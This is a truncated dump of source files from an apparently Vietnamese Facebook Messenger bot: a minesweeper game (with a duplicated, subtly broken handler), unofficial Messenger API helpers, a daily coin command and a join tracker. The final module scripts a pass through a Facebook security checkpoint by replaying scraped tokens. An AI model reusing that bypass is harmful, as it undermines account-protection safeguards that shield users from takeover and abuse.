(o.markked) ctx.drawImage(co, 100+100*i, 800-100*j, 100, 100);\n        }\n      }\n    }\n    var path = dirpath + id + \".png\";\n    fs.writeFileSync(path, canvas.toBuffer(\"image/png\"));\n    return path;\n  }\n  module.exports.onLoad = () => {\n    if (!fs.existsSync(dirpath)) fs.mkdirSync(dirpath);\n  }\n  module.exports.run = async function ({ api, event }) {\n    var { threadID, messageID, senderID } = event;\n    var choose = [\"1\", \"2\"];\n    var text = \"Reply l·ª±a ch·ªçn!\\n1. Ch∆°i m·ªõi\\n2. H∆∞·ªõng d·∫´n\";\n    if (fs.existsSync(dirpath + senderID + \".json\")) { choose.push(\"3\"); text += \"\\n3. Ch∆°i ti·∫øp\" }\n    return api.sendMessage(text, threadID, (error, info) => {\n      global.client.handleReply.push({\n        name: this.config.name,\n        messageID: info.messageID,\n        author: senderID,\n        invalidC: choose,\n        type: \"procedure\"\n      })\n    }, messageID)\n  }\n  module.exports.handleReply = async function ({ event, api, handleReply}) {\n    var {sendMessage: send, unsendMessage: unsend} = api;\n    var {threadID: tid, messageID: mid, senderID: sid, args } = event;\n  try {\n    if (sid !== handleReply.author) return;\n    if (handleReply.type == \"procedure\") {\n      if (!handleReply.invalidC.includes(event.body)) return send(\"‚ùå L·ª±a ch·ªçn kh√¥ng h·ª£p l·ªá!\", tid, mid);\n      if (event.body == \"1\") {\n        unsend(handleReply.messageID);\n        send(\"ƒêang kh·ªüi t·∫°o...\",tid,mid)\n        const numberOfMines = 10;\n        const map = [];\n        for (let i = 0; i < 10; i++) {\n          const row = [];\n          for (let j = 0; j < 7; j++) {\n            row.push({\n              opened: false,\n              isMine: false,\n              markked: false,\n              adjacentMines: 0\n            });\n          }\n          map.push(row);\n        }\n        let minesCount = 0;\n        while (minesCount < numberOfMines) {\n          const x = Math.floor(Math.random() * 10);\n          const y = Math.floor(Math.random() * 7);\n          if (!map[x][y].isMine) {\n            map[x][y].isMine = true;\n            minesCount++;\n          }\n        }\n        const directions = [\n          [0, 1],\n          [0, -1],\n          [1, 0],\n          [-1, 0],\n          [1, 1],\n          [1, -1],\n          [-1, 1],\n          [-1, -1]\n        ];\n        for (let i = 0; i < 10; i++) {\n          for (let j = 0; j < 7; j++) {\n            if (!map[i][j].isMine) {\n              let count = 0;\n              for (let k = 0; k < directions.length; k++) {\n                const [dx, dy] = directions[k];\n                const newX = i + dx;\n                const newY = j + dy;\n                if (newX >= 0 && newX < 10 && newY >= 0 && newY < 7 && map[newX][newY].isMine) count++; \n              }\n              map[i][j].adjacentMines = count;\n            }\n          }\n        }\n        for (let i = 0; i < 10; i++) {\n          for (let j = 0; j < 7; j++) {\n            if (map[i][j].adjacentMines == 0 && !map[i][j].isMine) map[i][j].opened = true;\n          }\n        }\n        fs.writeFileSync(dirpath+`${sid}.json`, JSON.stringify(map, null, 2));\n        return send({body:\"1. ƒê√†o l√™n\\n2. ƒê√°nh d·∫•u\\n3. B·ªè ƒë√°nh d·∫•u\\nVd: 1 E5,E4,E3 (ƒë√†o √¥ E5,E4,E3)\", attachment: fs.createReadStream(await draw(map, sid))}, tid, (error, info) => {\n          global.client.handleReply.push({\n            name: this.config.name,\n            messageID: info.messageID,\n            author: sid,\n            type: \"play\"\n          })\n        }, mid);\n      }\n      if (event.body == \"2\") {\n        unsend(handleReply.messageID);\n        return send(texthelp, tid, mid)\n      }\n      if (event.body == \"3\") {\n        try {\n        unsend(handleReply.messageID);\n        var map = JSON.parse(fs.readFileSync(dirpath+sid+\".json\"));\n        return send({body:\"1. ƒê√†o l√™n\\n2. ƒê√°nh d·∫•u\\n3. B·ªè ƒë√°nh d·∫•u\\nVd: 1 E5 (ƒë√†o √¥ E5)\", attachment: fs.createReadStream(await draw(map, sid))}, tid, (error, info) => {\n          global.client.handleReply.push({\n            name: this.config.name,\n            messageID: info.messageID,\n            author: sid,\n            type: \"play\"\n          })\n        }, mid);\n        } catch (error) {return send(`‚ùå ƒê√£ x·∫£y ra l·ªói!\\n Vui l√≤ng th·ª≠ l·∫°i ho·∫∑c ch∆°i m·ªõi\\n Chi ti·∫øt l·ªói:\\n${error}`,tid,mid)}\n      }\n    }\n    if (handleReply.type == \"play\") {\n      var map = JSON.parse(fs.readFileSync(dirpath + sid + \".json\"));\n      var choose = parseInt(args[0]);\n      if (![1, 2, 3].includes(choose) || args.length < 2) \n        return send(\"‚ùå C√∫ ph√°p kh√¥ng h·ª£p l·ªá!\", tid, mid);\n        unsend(handleReply.messageID); \n      var string = \"ABCDEFGHIK\";\n      var coordinates = args[1].split(\",\").map(coord => coord.trim());\n      var invalidCoords = [];\n      for (let coord of coordinates) {\n        var x = string.indexOf(coord.slice(0, 1).toUpperCase());\n        var y = parseInt(coord.slice(1));\n        if (x == -1 || isNaN(y) || y < 0 || y > 6) {\n          invalidCoords.push(coord);\n          continue;\n        }\n        if (choose == 1) {\n          if (map[x][y].opened) {\n            invalidCoords.push(coord);\n            continue;\n          }\n          if (map[x][y].markked) {\n            invalidCoords.push(coord);\n            continue;\n          }\n          map[x][y].opened = true;\n          if (map[x][y].isMine) {\n            fs.unlinkSync(dirpath + sid + \".json\");\n            return send({ body: `Tr√≤ ch∆°i k·∫øt th√∫c!\\nB·∫°n ƒë√£ ƒë√†o tr√∫ng m√¨n üí£ ·ªü ${coord}`, attachment: fs.createReadStream(await draw(map, sid)) }, tid, mid);\n          }\n        }\n        if (choose == 2) {\n          if (map[x][y].markked || map[x][y].opened) {\n            invalidCoords.push(coord);\n            continue;\n          }\n          map[x][y].markked = true;\n        }\n        if (choose == 3) {\n          if (!map[x][y].markked) {\n            invalidCoords.push(coord);\n            continue;\n          }\n          map[x][y].markked = false;\n        }\n      }\n      var unopen = 0;\n      for (let col of map) {\n        for (let cell of col) {\n          if (!cell.opened && !cell.isMine) unopen++;\n        }\n      }\n      if (unopen === 0) {\n        fs.unlinkSync(dirpath + sid + \".json\");\n        return send({ body: \"B·∫°n ƒë√£ th·∫Øng!\", attachment: fs.createReadStream(await draw(map, sid)) }, tid, mid);\n      }\n      fs.writeFileSync(dirpath + `${sid}.json`, JSON.stringify(map, null, 2));\n      let invalidMessage = invalidCoords.length > 0 \n        ? `T·ªça ƒë·ªô kh√¥ng h·ª£p l·ªá: ${invalidCoords.join(\", \")}\\nTi·∫øp t·ª•c`\n        : \"Ti·∫øp t·ª•c\";\n      return send({ \n        body: `${invalidMessage}\\n1. ƒê√†o l√™n\\n2. ƒê√°nh d·∫•u\\n3. B·ªè ƒë√°nh d·∫•u\\nVd: 1 E5,E4,E3`, \n        attachment: fs.createReadStream(await draw(map, sid)) \n      }, tid, (error, info) => {\n        global.client.handleReply.push({\n          name: this.config.name,\n          messageID: info.messageID,\n          author: sid,\n          type: \"play\"\n        });\n      }, mid);\n    }      if (handleReply.type == \"play\") {\n      var map = JSON.parse(fs.readFileSync(dirpath + sid + \".json\"));\n      var action = parseInt(args[0]);\n      var coordinates = args[1].split(\",\").map(coord => coord.trim());\n      if (!isValidSyntax(action, coordinates)) {\n        return send(\"‚ùå C√∫ ph√°p kh√¥ng h·ª£p l·ªá! Vui l√≤ng th·ª≠ l·∫°i.\\nVd: 1 E5,E4,E3\", tid, mid);\n      }\n      unsend(handleReply.messageID);\n      var invalidCoords = [];\n      for (let coord of coordinates) {\n        var string = \"ABCDEFGHIK\";\n        var x = string.indexOf(coord.slice(0, 1).toUpperCase());\n        var y = parseInt(coord.slice(1));\n        if (action === 1) {\n          if (map[x][y].opened || map[x][y].markked) {\n            invalidCoords.push(coord);\n            continue;\n          }\n          map[x][y].opened = true;\n          if (map[x][y].isMine) {\n            fs.unlinkSync(dirpath + sid + \".json\");\n            return send({ body: `Tr√≤ ch∆°i k·∫øt th√∫c!\\nB·∫°n ƒë√£ ƒë√†o tr√∫ng m√¨n üí£ ·ªü ${coord}`, attachment: fs.createReadStream(await draw(map, sid)) }, tid, mid);\n          }\n        }\n        if (action === 2) {\n          if (map[x][y].markked || map[x][y].opened) {\n            invalidCoords.push(coord);\n            continue;\n          }\n          map[x][y].markked = true;\n        }\n        if (action === 3) {\n          if (!map[x][y].markked) {\n            invalidCoords.push(coord);\n            continue;\n          }\n          map[x][y].markked = false;\n        }\n      }\n      var unopen = 0;\n      for (let col of map) {\n        for (let cell of col) {\n          if (!cell.opened && !cell.isMine) unopen++;\n        }\n      }\n      if (unopen === 0) {\n        fs.unlinkSync(dirpath + sid + \".json\");\n        return send({ body: \"B·∫°n ƒë√£ th·∫Øng!\", attachment: fs.createReadStream(await draw(map, sid)) }, tid, mid);\n      }\n      fs.writeFileSync(dirpath + `${sid}.json`, JSON.stringify(map, null, 2));\n      let invalidMessage = invalidCoords.length > 0 \n        ? `T·ªça ƒë·ªô kh√¥ng h·ª£p l·ªá: ${invalidCoords.join(\", \")}\\nTi·∫øp t·ª•c`\n        : \"Ti·∫øp t·ª•c\";\n      return send({ \n        body: `${invalidMessage}\\n1. ƒê√†o l√™n\\n2. ƒê√°nh d·∫•u\\n3. B·ªè ƒë√°nh d·∫•u\\nVd: 1 E5,E4,E3`, \n        attachment: fs.createReadStream(await draw(map, sid)) \n      }, tid, (error, info) => {\n        global.client.handleReply.push({\n          name: this.config.name,\n          messageID: info.messageID,\n          author: sid,\n          type: \"play\"\n        });\n      }, mid);\n    }    \n  } catch(error) {return send(\"ƒê√£ x·∫£y ra l·ªói!\"+error, tid, mid)}\n  }","path":null,"size_bytes":12211,"size_tokens":null},"lib/fca-auto/src/getThreadMain.js":{"content":"\"use strict\";\n\nvar utils = require(\"../utils\");\nvar log = require(\"npmlog\");\n// t∆∞∆°ng lai ƒëi r·ªìi fix ahahha\nfunction formatEventReminders(reminder) {\n  return {\n    reminderID: reminder.id,\n    eventCreatorID: reminder.lightweight_event_creator.id,\n    time: reminder.time,\n    eventType: reminder.lightweight_event_type.toLowerCase(),\n    locationName: reminder.location_name,\n    // @TODO verify this\n    locationCoordinates: reminder.location_coordinates,\n    locationPage: reminder.location_page,\n    eventStatus: reminder.lightweight_event_status.toLowerCase(),\n    note: reminder.note,\n    repeatMode: reminder.repeat_mode.toLowerCase(),\n    eventTitle: reminder.event_title,\n    triggerMessage: reminder.trigger_message,\n    secondsToNotifyBefore: reminder.seconds_to_notify_before,\n    allowsRsvp: reminder.allows_rsvp,\n    relatedEvent: reminder.related_event,\n    members: reminder.event_reminder_members.edges.map(function(member) {\n      return {\n        memberID: member.node.id,\n        state: member.guest_list_state.toLowerCase()\n      };\n    })\n  };\n}\n\nfunction formatThreadGraphQLResponse(data) {\n  try{\n    var messageThread = data.message_thread;\n  } catch (err){\n    console.error(\"GetThreadInfoGraphQL\", \"Can't get this thread info!\");\n    return {err: err};\n  }\n  var threadID = messageThread.thread_key.thread_fbid\n    ? messageThread.thread_key.thread_fbid\n    : messageThread.thread_key.other_user_id;\n\n  // Remove me\n  var lastM = messageThread.last_message;\n  var snippetID =\n    lastM &&\n    lastM.nodes &&\n    lastM.nodes[0] &&\n    lastM.nodes[0].message_sender &&\n    lastM.nodes[0].message_sender.messaging_actor\n      ? lastM.nodes[0].message_sender.messaging_actor.id\n      : null;\n  var snippetText =\n    lastM && lastM.nodes && lastM.nodes[0] ? lastM.nodes[0].snippet : null;\n  var lastR = messageThread.last_read_receipt;\n  var lastReadTimestamp =\n    lastR && lastR.nodes && lastR.nodes[0] && lastR.nodes[0].timestamp_precise\n      ? lastR.nodes[0].timestamp_precise\n      : null;\n\n  return {\n    threadID: threadID,\n    threadName: messageThread.name,\n    participantIDs: messageThread.all_participants.edges.map(d => d.node.messaging_actor.id),\n    userInfo: messageThread.all_participants.edges.map(d => ({\n      id: d.node.messaging_actor.id,\n      name: d.node.messaging_actor.name,\n      firstName: d.node.messaging_actor.short_name,\n      vanity: d.node.messaging_actor.username,\n      thumbSrc: d.node.messaging_actor.big_image_src.uri,\n      profileUrl: d.node.messaging_actor.big_image_src.uri,\n      gender: d.node.messaging_actor.gender,\n      type: d.node.messaging_actor.__typename,\n      isFriend: d.node.messaging_actor.is_viewer_friend,\n      isBirthday: !!d.node.messaging_actor.is_birthday //not sure?\n    })),\n    unreadCount: messageThread.unread_count,\n    messageCount: messageThread.messages_count,\n    timestamp: messageThread.updated_time_precise,\n    muteUntil: messageThread.mute_until,\n    isGroup: messageThread.thread_type == \"GROUP\",\n    isSubscribed: messageThread.is_viewer_subscribed,\n    isArchived: messageThread.has_viewer_archived,\n    folder: messageThread.folder,\n    cannotReplyReason: messageThread.cannot_reply_reason,\n    eventReminders: messageThread.event_reminders\n      ? messageThread.event_reminders.nodes.map(formatEventReminders)\n      : null,\n    emoji: messageThread.customization_info\n      ? messageThread.customization_info.emoji\n      : null,\n    color:\n      messageThread.customization_info &&\n      messageThread.customization_info.outgoing_bubble_color\n        ? messageThread.customization_info.outgoing_bubble_color.slice(2)\n        : null,\n    nicknames:\n      messageThread.customization_info &&\n      messageThread.customization_info.participant_customizations\n        ? messageThread.customization_info.participant_customizations.reduce(\n            function(res, val) {\n              if (val.nickname) res[val.participant_id] = val.nickname;\n              return res;\n            },\n            {}\n          )\n        : {},\n    adminIDs: messageThread.thread_admins,\n    approvalMode: Boolean(messageThread.approval_mode),\n    approvalQueue: messageThread.group_approval_queue.nodes.map(a => ({\n      inviterID: a.inviter.id,\n      requesterID: a.requester.id,\n      timestamp: a.request_timestamp,\n      request_source: a.request_source // @Undocumented\n    })),\n\n    // @Undocumented\n    reactionsMuteMode: messageThread.reactions_mute_mode.toLowerCase(),\n    mentionsMuteMode: messageThread.mentions_mute_mode.toLowerCase(),\n    isPinProtected: messageThread.is_pin_protected,\n    relatedPageThread: messageThread.related_page_thread,\n\n    // @Legacy\n    name: messageThread.name,\n    snippet: snippetText,\n    snippetSender: snippetID,\n    snippetAttachments: [],\n    serverTimestamp: messageThread.updated_time_precise,\n    imageSrc: messageThread.image ? messageThread.image.uri : null,\n    isCanonicalUser: messageThread.is_canonical_neo_user,\n    isCanonical: messageThread.thread_type != \"GROUP\",\n    recipientsLoadable: true,\n    hasEmailParticipant: false,\n    readOnly: false,\n    canReply: messageThread.cannot_reply_reason == null,\n    lastMessageTimestamp: messageThread.last_message\n      ? messageThread.last_message.timestamp_precise\n      : null,\n    lastMessageType: \"message\",\n    lastReadTimestamp: lastReadTimestamp,\n    threadType: messageThread.thread_type == \"GROUP\" ? 2 : 1,\n    TimeCreate: Date.now(),\n    TimeUpdate: Date.now()\n  };\n}\n\nmodule.exports = function(defaultFuncs, api, ctx) {\n  return function getThreadInfoGraphQL(threadID, callback) {\n    var resolveFunc = function(){};\n    var rejectFunc = function(){};\n    var returnPromise = new Promise(function (resolve, reject) {\n      resolveFunc = resolve;\n      rejectFunc = reject;\n    });\n\n    if (utils.getType(callback) != \"Function\" && utils.getType(callback) != \"AsyncFunction\") {\n      callback = function (err, data) {\n        if (err) {\n          return rejectFunc(err);\n        }\n        resolveFunc(data);\n      };\n    }\n    \n    //! ƒë∆∞·ª£c t√¨m th·∫•y v√†o gi·ªØa th√°ng 8/2022 b·ªüi @KanzuWakazaki - ƒë√£ ƒë∆∞·ª£c chia s·∫ª cho @D-Jukie v√† Horizon Team Public group ü§¥\n    //* nh·ªØng code t∆∞∆°ng t·ª± muliti thread nh∆∞ n√†y ƒë·ªÅu c√≥ th·ªÉ l√† copy idea üêß\n    //* ƒë√£ √°p d·ª•ng v√†o fca m·ªõi(cloud - fca(private)) v√†o cu·ªëi th√°ng 8/2022 b·ªüi @IteralingCode(Hidden Member( always :) )) - Synthetic 4 - @Horizon Team\n    //*c·∫≠p nh·∫≠t d·ª± √°n b·ªã b·ªè r∆°i n√†y v√†o ng√†y 19/11/2022 b·ªüi @KanzuWakazaki(Owner) - Synthetic 1  - @Horizon Team nh·∫±m ƒë√°p ·ª©ng nhu c·∫ßu c·ªßa client !\n\n      if (utils.getType(threadID) !== \"Array\") threadID = [threadID];\n      \n      var Form = {};\n      var ThreadInfo = [];\n\n      threadID.map(function (x,y) {\n        Form[\"o\" + y] = {\n          doc_id: \"3449967031715030\",\n          query_params: {\n            id: x,\n            message_limit: 0,\n            load_messages: false,\n            load_read_receipts: false,\n            before: null\n          }\n        };\n      });\n\n    var form = {\n      queries: JSON.stringify(Form),\n      batch_name: \"MessengerGraphQLThreadFetcher\"\n    };\n\n    defaultFuncs\n      .post(\"https://www.facebook.com/api/graphqlbatch/\", ctx.jar, form)\n      .then(utils.parseAndCheckLogin(ctx, defaultFuncs))\n      .then(function(resData) {\n      if (resData.error) {\n        callback(null,resData.error);\n        throw resData;\n      }\n      resData = resData.splice(0, resData.length - 1);\n      resData.sort((a, b) => { return Object.keys(a)[0].localeCompare(Object.keys(b)[0]); });\n      resData.map(function (x,y) {\n        ThreadInfo.push(formatThreadGraphQLResponse(x[\"o\"+y].data));\n      });\n      if (Object.keys(resData).length == 1) {\n        callback(null, ThreadInfo[0]);\n      } else {\n      callback(null, ThreadInfo);\n      }\n    })\n    .catch(function(err) {\n\n      log.error(\"getThreadInfoGraphQL\", \"L·ªói: getThreadInfoGraphQL C√≥ Th·ªÉ Do B·∫°n Spam Qu√° Nhi·ªÅu, H√£y Th·ª≠ L·∫°i !\");\n    return callback(err);\n  });\n  return returnPromise;\n  };\n};","path":null,"size_bytes":8074,"size_tokens":null},"lib/fca-auto/src/getUID.js":{"content":"/* eslint-disable linebreak-style */\n\"use strict\";\n\nmodule.exports = function (_defaultFuncs, api, _ctx) {\n    return function getUID(link, callback) {\n      var resolveFunc = function () { };\n      var rejectFunc = function () { };\n      var returnPromise = new Promise(function (resolve, reject) {\n        resolveFunc = resolve;\n        rejectFunc = reject;\n      });\n  \n      if (!callback) {\n        callback = function (err, uid) {\n          if (err) return rejectFunc(err);\n          resolveFunc(uid);\n        };\n      }\n      \n    try {\n        var Link = String(link);\n        var FindUID = require('../Extra/ExtraFindUID');\n        if (Link.includes('facebook.com') || Link.includes('Facebook.com') || Link.includes('fb')) {\n            var LinkSplit = Link.split('/');\n            if (LinkSplit.indexOf(\"https:\") == 0) {\n              if (!isNaN(LinkSplit[3]) && !Link.split('=')[1]  && !isNaN(Link.split('=')[1])) {\n                api.sendMessage('Sai Link, Link C·∫ßn C√≥ ƒê·ªãnh D·∫°ng Nh∆∞ Sau: facebook.com/Lazic.Kanzu',global.Fca.Data.event.threadID,global.Fca.Data.event.messageID);\n                callback(null, String(4));\n              }\n              else if (!isNaN(Link.split('=')[1]) && Link.split('=')[1]) {\n                var Format = `https://www.facebook.com/profile.php?id=${Link.split('=')[1]}`;\n                FindUID(Format,api).then(function (data) {\n                  callback(null, data);\n                });\n              } \n              else {\n                FindUID(Link,api).then(function (data) {\n                  callback(null, data);\n                });\n              }\n            }\n            else {\n                var Form = `https://www.facebook.com/${LinkSplit[1]}`;\n                FindUID(Form,api).then(function (data) {\n                    callback(null, data);\n                });\n            }\n        }\n        else {\n            callback(null, null);\n            api.sendMessage('Sai Link, Link C·∫ßn L√† Link C·ªßa Facebook',global.Fca.Data.event.threadID,global.Fca.Data.event.messageID);\n        }\n    }\n    catch (e) {\n      return callback(null, e);\n    }\n    return returnPromise;\n    };\n  };","path":null,"size_bytes":2162,"size_tokens":null},"modules/commands/daily.js":{"content":"module.exports.config = {\n  name: \"daily\",\n  version: \"1.0.2\",\n  hasPermssion: 0,\n  credits: \"Mirai Team\",\n  description: \"Nh·∫≠n 10000 coins m·ªói ng√†y!\",\n  commandCategory: \"Ti·ªán √≠ch\",\n    cooldowns: 5,\n    envConfig: {\n        cooldownTime: 43200000,\n        rewardCoin: 10000\n    }\n};\n\nmodule.exports.languages = {\n    \"vi\": {\n        \"cooldown\": \"ùêÅùêöÃ£ùêß ùê°ùê¢ùêûÃ£ÃÇùêß ùê≠ùê´ùê®ùêßùê† ùê≠ùê°ùê®ÃõÃÄùê¢ ùê†ùê¢ùêöùêß ùêúùê°ùê®ÃõÃÄ\\nùêïùêÆùê¢ ùê•ùê®ÃÄùêßùê† ùê≠ùê°ùêÆÃõÃâ ùê•ùêöÃ£ùê¢ ùê¨ùêöùêÆ: %1 gi·ªù %2 ph√∫t %3 gi√¢y!\",\n        \"rewarded\": \"ùêÅùêöÃ£ùêß ùêØùêÆÃõÃÄùêö ùêßùê°ùêöÃ£ÃÇùêß %1$, ùêçùêûÃÇÃÅùêÆ ùê¶ùêÆùê®ÃÇÃÅùêß ùê≠ùê¢ùêûÃÇÃÅùê© ùê≠ùêÆÃ£ùêú ùêßùê°ùêöÃ£ÃÇùêß, ùêØùêÆùê¢ ùê•ùê®ÃÄùêßùê† ùê™ùêÆùêöùê≤ ùê•ùêöÃ£ùê¢ ùê¨ùêöùêÆ ùüèùüê ùê≠ùê¢ùêûÃÇÃÅùêßùê†\"\n    },\n    \"en\": {\n        \"cooldown\": \"You received today's rewards, please come back after: %1 hours %2 minutes %3 seconds.\",\n        \"rewarded\": \"You received %1$, to continue to receive, please try again after 12 hours\"\n    }\n}\n\nmodule.exports.run = async ({ event, api, Currencies, getText }) => {\n    const { daily } = global.configModule,\n        cooldownTime = daily.cooldownTime,\n        rewardCoin = daily.rewardCoin;\n\n    var { senderID, threadID } = event;\n\n    let data = (await Currencies.getData(senderID)).data || {};\n    if (typeof data !== \"undefined\" && cooldownTime - (Date.now() - (data.dailyCoolDown || 0)) > 0) {\n        var time = cooldownTime - (Date.now() - data.dailyCoolDown),\n            seconds = Math.floor( (time/1000) % 60 ),\n            minutes = Math.floor( (time/1000/60) % 60 ),\n            hours = Math.floor( (time/(1000*60*60)) % 24 );\n\n    return api.sendMessage(getText(\"cooldown\", hours, minutes, (seconds < 10 ? \"0\" : \"\") + seconds), threadID);\n    }\n\n    else return api.sendMessage(getText(\"rewarded\", rewardCoin), threadID, async () => {\n        await Currencies.increaseMoney(senderID, rewardCoin);\n        data.dailyCoolDown = Date.now();\n        await Currencies.setData(senderID, { data });\n        return;\n    });\n}","path":null,"size_bytes":2131,"size_tokens":null},"modules/commands/timejoin.js":{"content":"module.exports.config = {\n  name: \"timejoin\",\n  version: \"1.0.2\",\n  hasPermssion: 0,\n  credits: \"Judas - Fixed by ChatGPT\",\n  description: \"Theo d√µi th·ªùi gian join, g·ª≠i tin nh·∫Øn text\",\n  commandCategory: \"Qu·∫£n L√≠ Box\",\n  usages: \"\",\n  cooldowns: 3,\n  dependencies: {\n    \"fs-extra\": \"\",\n    moment: \"\",\n    axios: \"\"\n  },\n};\n\nconst fs = require(\"fs-extra\");\nconst path = require(\"path\");\nconst moment = require(\"moment-timezone\");\n\nmodule.exports.handleEvent = async function({ event, Users }) {\n  const get = moment.tz(\"Asia/Ho_Chi_Minh\");\n  const gio = get.format(\"HH:mm:ss\");\n  const ngay = get.format(\"YYYY-MM-D\");\n  const burh = get.format(\"D/MM/YYYY\");\n\n  const { threadID, senderID } = event;\n  const pathxData = path.join(__dirname, \"cache/timejoin\", threadID + \".json\");\n  if (!fs.existsSync(pathxData)) fs.writeFileSync(pathxData, \"[]\", \"utf-8\");\n\n  let dataJson = JSON.parse(fs.readFileSync(pathxData, \"utf-8\"));\n  if (!dataJson.find(i => i.senderID === senderID)) {\n    const resname = (await Users.getData(senderID)).name;\n    dataJson.push({\n      senderID,\n      opt: { name: resname, gio, ngay, burh }\n    });\n    fs.writeFileSync(pathxData, JSON.stringify(dataJson, null, 4), \"utf-8\");\n  }\n};\n\nmodule.exports.run = async function({ api, event, args, Users }) {\n  const { threadID, senderID, messageID, mentions, messageReply, type } = event;\n  const get = moment.tz(\"Asia/Ho_Chi_Minh\");\n  const gio = get.format(\"HH:mm:ss\");\n  const ngay = get.format(\"YYYY-MM-D\");\n  const burh = get.format(\"D/MM/YYYY\");\n\n  const pathxData = path.join(__dirname, \"cache/timejoin\", threadID + \".json\");\n  if (!fs.existsSync(pathxData)) fs.writeFileSync(pathxData, \"[]\", \"utf-8\");\n  let dataJson = JSON.parse(fs.readFileSync(pathxData, \"utf-8\"));\n\n  // X√°c ƒë·ªãnh target\n  let targetID = senderID;\n  if (!args[0]) {\n    if (type === \"message_reply\") targetID = messageReply.senderID;\n    else if (Object.keys(mentions).length === 1) targetID = Object.keys(mentions)[0];\n  }\n\n  // L∆∞u d·ªØ li·ªáu join n·∫øu ch∆∞a c√≥\n  if (!dataJson.find(i => i.senderID === targetID)) {\n    const resname = (await Users.getData(targetID)).name;\n    dataJson.push({\n      senderID: targetID,\n      opt: { name: resname, gio, ngay, burh }\n    });\n    fs.writeFileSync(pathxData, JSON.stringify(dataJson, null, 4), \"utf-8\");\n  }\n\n  const user = dataJson.find(i => i.senderID === targetID);\n  if (!user) return api.sendMessage(\"Kh√¥ng t√¨m th·∫•y th√¥ng tin user.\", threadID, messageID);\n\n  // T√≠nh s·ªë ng√†y\n  const gn1 = new Date(`${user.opt.ngay} ${user.opt.gio}`);\n  const gn2 = new Date();\n  const get_Ngay = Math.ceil((gn2 - gn1) / (24 * 60 * 60 * 1000));\n\n  // Chu·∫©n b·ªã tin nh·∫Øn text\n  const msg = `üìå Th√¥ng tin join box:\\n` +\n              `¬ª Name: ${user.opt.name}\\n` +\n              `¬ª UID: ${user.senderID}\\n` +\n              `¬ª Time Join: ${user.opt.gio}\\n` +\n              `¬ª Ng√†y Join: ${user.opt.burh}\\n` +\n              `¬ª S·ªë ng√†y tham gia: ${get_Ngay}\\n` +\n              `¬ª Profile: https://www.facebook.com/profile.php?id=${user.senderID}`;\n\n  return api.sendMessage(msg, threadID, messageID);\n};\n","path":null,"size_bytes":3128,"size_tokens":null},"lib/Fca-Horizon-Remastered/Extra/Bypass/956/index.js":{"content":"/** By @KanzuWakazaki 03/05/2024 - DD/MM/YYYY */\n// !Type - change password is not required\nfunction Find_And_Parse(Data) {\n    const regex = /<script\\s+type=\"application\\/json\"\\s+data-content-len=\"([0-9]+)\"\\s+data-sjs\\s*(.*?)\\s*<\\/script>/gs;\n    const matches = Data.matchAll(regex);\n    let Data_resp;\n    for (const match of matches) {\n        if (JSON.parse(JSON.stringify((match[2]))).includes('any_eligible_challenges')) {\n            const Data_ = JSON.parse(match[2].replace('>', ''))\n            Data_resp = findAnyEligibleChallengesAndSiblings(Data_)\n        }\n\n    }\n    \n    \n    function findAnyEligibleChallengesAndSiblings(data) {\n        const screenData = findScreenData(data);\n        if (!screenData) {\n            return null;\n        }\n    \n        const siblings = {};\n        for (const [key, value] of Object.entries(screenData)) {\n            if (key === 'any_eligible_challenges') {\n                siblings[key] = value;\n            } \n            else {\n                siblings[key] = value;\n            }\n        }\n    \n        return siblings;\n    }\n    \n    function findScreenData(data) {\n        if (Array.isArray(data)) {\n            for (const item of data) {\n                const result = findScreenData(item);\n                if (result) {\n                    return result;\n                }\n            }\n        } \n        else if (typeof data === 'object' && data !== null) {\n            if (data.screen) {\n                return data.screen;\n            }\n            for (const value of Object.values(data)) {\n                const result = findScreenData(value);\n                if (result) {\n                    return result;\n                }\n            }\n        }\n        return null;\n    }    \n    return Data_resp.token || null\n}\n\nmodule.exports.Check = Find_And_Parse\nmodule.exports.Cook_And_Work = async function(ctx, defaultFuncs) {\n    const utils = require('../../../utils');\n    var Form_P1;\n    var CanResolve_P1;\n    var NextToken_P1;\n    var lsd;\n\n    const Level_1 = () => new Promise((re, rj) => {\n        try {\n            utils.get('https://www.facebook.com/checkpoint/828281030927956/?next=https%3A%2F%2Faccountscenter.facebook.com%2Fpassword_and_security', ctx.jar, null, ctx.globalOptions)\n            .then(function(data) {\n                lsd = utils.getFrom(data.body, \"[\\\"LSD\\\",[],{\\\"token\\\":\\\"\", \"\\\"}\")\n                Form_P1 = {\n                    lsd: lsd,\n                    fb_api_caller_class: 'RelayModern',\n                    fb_api_req_friendly_name: 'useEpsilonNavigateMutation',\n                    variables: JSON.stringify({\n                        input:{\n                            client_mutation_id:\"1\",\n                            actor_id: ctx.userId,\n                            step:\"STEPPER_CONFIRMATION\",\n                            token : JSON.stringify({\n                                sensitive_string_value: Find_And_Parse(data.body)\n                            })\n                        },\n                        scale:1\n                    }),\n                    server_timestamps: true,\n                    doc_id: 7414856831926043\n                };\n            })\n            .then(function() {\n                defaultFuncs.postFormData('https://www.facebook.com/api/graphql/', ctx.jar, Form_P1, {}) \n                .then(function(resp) {\n                    let checkpoint = resp.data.epsilon_navigate.epsilon_checkpoint;\n                    if (checkpoint.id == '__EPSILON_CLIENT__' && checkpoint.__typename == \"EpsilonStepperScreen\" && checkpoint.screen.next_screen == 'CONTACT_POINT_REVIEW' && checkpoint.screen.steps.length === 3 && checkpoint.screen.steps[1].active == true) {\n                        NextToken_P1 = checkpoint.screen.token;    \n                        CanResolve_P1 = true;\n                        re(CanResolve_P1)\n                    }\n                    else {\n                        CanResolve_P1 = false; \n                        re(CanResolve_P1)\n                    }\n                });\n            })\n        }\n        catch (e) {\n            rj(e);\n        }\n    })\n\n    await Level_1();\n\n    var CanResolve_P2;\n    var NextToken_P2;\n\n    const Level_2 = () => new Promise((re, rj) => {\n        let Form_P2 = {\n            doc_id: 7414856831926043,\n            lsd: lsd,\n            fb_api_caller_class: \"RelayModern\",\n            fb_api_req_friendly_name: \"useEpsilonNavigateMutation\",\n            server_timestamps: true,\n            variables: JSON.stringify({\n                input: {\n                    client_mutation_id: 2,\n                    actor_id: ctx.userId,\n                    step:\"CONTACT_POINT_REVIEW\",\n                    token: JSON.stringify({\n                        sensitive_string_value: NextToken_P1\n                    })\n                },\n                scale: 1\n            })\n        }\n        \n        defaultFuncs.postFormData('https://www.facebook.com/api/graphql/', ctx.jar, Form_P2, {}).then(function(resp) {\n            let checkpoint = resp.data.epsilon_navigate.epsilon_checkpoint;\n            if (checkpoint.id == '__EPSILON_CLIENT__' && checkpoint.__typename == \"EpsilonContactPointReview\" && checkpoint.screen.contact_points.length >= 1 && checkpoint.screen.contact_points[0].suspicious == 